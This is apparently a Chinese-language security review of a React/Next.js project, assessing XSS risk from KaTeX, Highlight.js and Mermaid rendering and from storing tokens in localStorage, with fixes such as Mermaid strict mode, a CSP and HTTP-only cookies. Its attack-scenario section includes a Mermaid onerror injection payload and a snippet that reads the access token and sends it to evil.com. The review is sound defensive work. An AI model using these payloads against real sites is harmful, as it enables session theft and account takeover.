# 项目安全评估报告

## 1. 框架保护机制

### ✅ React 自动转义

你的项目使用 **React + Next.js**，默认有以下保护：

```typescript
// ✅ 安全：React 自动转义
<div>{userInput}</div>
<div title={userInput}></div>
<input value={userInput} />

// React 会自动转义：
// < → &lt;
// > → &gt;
// " → &quot;
// ' → &#x27;
// & → &amp;
```

**结论**：只要你使用标准的 JSX 语法，React 会自动保护你免受 XSS 攻击。

---

## 2. 项目中的 `dangerouslySetInnerHTML` 使用

### 发现的使用场景

```typescript
// 1. KaTeX 数学公式渲染
frontend / src / components / mdx / katex - math.tsx;
dangerouslySetInnerHTML: {
  __html: katex.renderToString(latex);
}

// 2. Highlight.js 代码高亮
frontend / src / components / mdx / code - block.tsx;
dangerouslySetInnerHTML: {
  __html: hljs.highlight(code).value;
}

// 3. Mermaid 图表渲染
frontend / src / components / mdx / mermaid - diagram.tsx;
dangerouslySetInnerHTML: {
  __html: mermaid.render(chartId, code).svg;
}
```

### 安全性分析

#### ✅ KaTeX (数学公式)

```typescript
// KaTeX 会自动转义恶意代码
const malicious = '<script>alert("XSS")</script>';
katex.renderToString(malicious);
// 输出：<span class="katex-error">...</span>
// 或者转义为：&lt;script&gt;...
```

**风险等级**：🟢 低

**原因**：

- KaTeX 只渲染数学公式，不执行 JavaScript
- 恶意代码会被转义或报错
- KaTeX 是成熟的库，有安全审计

**建议**：

- ✅ 保持 KaTeX 版本更新
- ✅ 定期运行 `npm audit`

---

#### ✅ Highlight.js (代码高亮)

```typescript
// Highlight.js 只添加语法高亮标签
const malicious = '<script>alert("XSS")</script>';
hljs.highlight(malicious, { language: "javascript" }).value;
// 输出：<span class="hljs-tag">&lt;script&gt;</span>...
// 脚本被转义了！
```

**风险等级**：🟢 低

**原因**：

- Highlight.js 只添加 `<span>` 标签用于语法高亮
- 代码内容会被转义
- 不会执行代码

**建议**：

- ✅ 保持 Highlight.js 版本更新
- ✅ 确保只用于代码展示，不用于执行

---

#### ⚠️ Mermaid (图表渲染)

```typescript
// Mermaid 渲染 SVG 图表
mermaid.render(chartId, code);
// 输出：<svg>...</svg>
```

**风险等级**：🟡 中等

**原因**：

- Mermaid 渲染 SVG，SVG 可以包含 `<script>` 标签
- 虽然 Mermaid 有安全机制，但 SVG 本身有风险
- 曾有 Mermaid XSS 漏洞报告（已修复）

**潜在攻击**：

```javascript
// 恶意的 Mermaid 代码
graph TD
  A[Start] -->|<img src=x onerror=alert(1)>| B[End]
```

**建议**：

- ⚠️ 如果用户可以输入 Mermaid 代码，需要额外验证
- ✅ 保持 Mermaid 版本更新（当前使用最新版）
- ✅ 考虑使用 `securityLevel: 'strict'`（你当前用的是 `'loose'`）

**改进建议**：

```typescript
// 当前配置
mermaid.initialize({
  securityLevel: "loose", // ← 改为 'strict'
});

// 推荐配置
mermaid.initialize({
  securityLevel: "strict", // ← 更安全
  startOnLoad: false,
  theme: mermaidTheme,
});
```

---

## 3. 最大的安全风险：LocalStorage 存储 Token

### ❌ 当前实现

```typescript
// frontend/src/hooks/use-auth.ts
localStorage.setItem("access_token", token);
```

**风险等级**：🔴 高

**原因**：

- 即使 React 有自动转义保护
- 即使你没有使用危险的 API
- **只要有一个 XSS 漏洞，Token 就会被偷走**

### 可能的 XSS 来源

```typescript
// 1. 第三方库漏洞
// 你使用了很多第三方库：
// - KaTeX
// - Highlight.js
// - Mermaid
// - React Query
// - Shadcn UI
// - ...
// 任何一个库有漏洞，都可能导致 XSS

// 2. 未来的代码变更
// 如果未来有人添加了：
<div dangerouslySetInnerHTML={{ __html: userComment }} />
// Token 就会被偷走

// 3. 浏览器扩展
// 恶意的浏览器扩展可以读取 localStorage
```

### 攻击场景

```javascript
// 假设 Mermaid 有漏洞（或者未来有人不小心添加了漏洞）
// 黑客可以：
const token = localStorage.getItem("access_token");
fetch("https://evil.com/steal?token=" + token);

// ✅ 成功偷走 Token！
// ✅ 黑客可以登录你的账号！
```

---

## 4. 完整的安全评分

| 安全项                      | 状态            | 风险等级 | 说明                 |
| --------------------------- | --------------- | -------- | -------------------- |
| **React 自动转义**          | ✅ 有           | 🟢 低    | 默认保护             |
| **KaTeX 使用**              | ✅ 安全         | 🟢 低    | 库会转义             |
| **Highlight.js 使用**       | ✅ 安全         | 🟢 低    | 库会转义             |
| **Mermaid 使用**            | ⚠️ 注意         | 🟡 中    | 建议改为 strict 模式 |
| **Content Security Policy** | ❌ 无           | 🟡 中    | 建议添加             |
| **输入验证**                | ❓ 未知         | 🟡 中    | 需要检查后端         |
| **Token 存储**              | ❌ LocalStorage | 🔴 高    | **最大风险！**       |

**总体评分**：⚠️ **中等风险**

**最大风险**：LocalStorage 存储 Token

---

## 5. 改进建议

### 短期（立即可做）

#### 1. 修改 Mermaid 安全级别

```typescript
// frontend/src/components/mdx/mermaid-diagram.tsx
mermaid.initialize({
  startOnLoad: false,
  theme: mermaidTheme,
  securityLevel: "strict", // ← 改为 strict
  flowchart: { useMaxWidth: true, htmlLabels: false }, // ← 禁用 HTML 标签
  sequence: { useMaxWidth: true },
  gantt: { useMaxWidth: false },
});
```

#### 2. 添加 Content Security Policy

```typescript
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          {
            key: "Content-Security-Policy",
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline' 'unsafe-eval'", // Next.js 需要
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "font-src 'self' data:",
              "connect-src 'self' " + process.env.NEXT_PUBLIC_API_URL,
            ].join("; "),
          },
        ],
      },
    ];
  },
};
```

#### 3. 定期更新依赖

```bash
# 检查漏洞
npm audit

# 自动修复
npm audit fix

# 更新依赖
npm update
```

---

### 长期（重构）

#### 迁移到 HTTP-only Cookie

这是**最重要的改进**！

```typescript
// 1. 创建登录 API Route
// app/api/auth/login/route.ts
export async function POST(request: Request) {
  const { email, password } = await request.json();

  const res = await fetch(`${process.env.API_URL}/token`, {
    method: "POST",
    body: new URLSearchParams({ username: email, password }),
  });

  const data = await res.json();

  const response = NextResponse.json({ success: true });
  response.cookies.set("session_token", data.access_token, {
    httpOnly: true, // ← JavaScript 读不到
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax",
    maxAge: 60 * 60 * 24 * 7,
  });

  return response;
}

// 2. 修改前端登录逻辑
async function login(email: string, password: string) {
  const res = await fetch("/api/auth/login", {
    method: "POST",
    body: JSON.stringify({ email, password }),
  });

  if (res.ok) {
    // ✅ Token 已经在 Cookie 中，不需要手动存储
    router.push("/dashboard");
  }
}

// 3. 服务端组件自动获取用户信息
export default async function DashboardPage() {
  const token = cookies().get("session_token")?.value;

  if (!token) {
    redirect("/login");
  }

  const res = await fetch(`${process.env.API_URL}/users/me`, {
    headers: { Authorization: `Bearer ${token}` },
  });

  const user = await res.json();

  return <div>欢迎, {user.username}</div>;
}
```

**改进后的安全性**：

```javascript
// 即使有 XSS 漏洞
const token = document.cookie; // ← 读不到！
const token = localStorage.getItem("access_token"); // ← 没有！

// ✅ Token 无法被偷走
// ✅ 账号安全
```

---

## 6. 总结

### 现代框架的保护

**✅ React/Vue 确实有成熟的 XSS 防护机制**：

1. **自动转义**：默认转义所有用户输入
2. **明确的危险 API**：`dangerouslySetInnerHTML` 名字就在警告你
3. **社区最佳实践**：大量文档和教程

### 但是！

**❌ 框架无法保护的场景**：

1. **主动使用危险 API**：`dangerouslySetInnerHTML`、`v-html`
2. **第三方库漏洞**：任何依赖都可能有漏洞
3. **直接操作 DOM**：绕过框架保护
4. **LocalStorage 存储敏感信息**：框架管不了

### 你的项目

**当前状态**：⚠️ 中等风险

**主要风险**：LocalStorage 存储 Token

**建议**：

1. ✅ 短期：修改 Mermaid 配置，添加 CSP
2. ✅ 长期：迁移到 HTTP-only Cookie

### 最终答案

**是的，现代框架有成熟的 XSS 防护机制，但：**

1. **框架只能保护你不犯错**，不能保护你主动犯错
2. **框架无法保护第三方库的漏洞**
3. **框架无法保护 LocalStorage**

**最佳实践**：

```
框架保护（React/Vue）
+
Content Security Policy
+
输入验证
+
HTTP-only Cookie
=
真正的安全
```

你的项目已经有了第 1 层保护（React），但缺少第 2、4 层，这就是为什么仍然有风险。
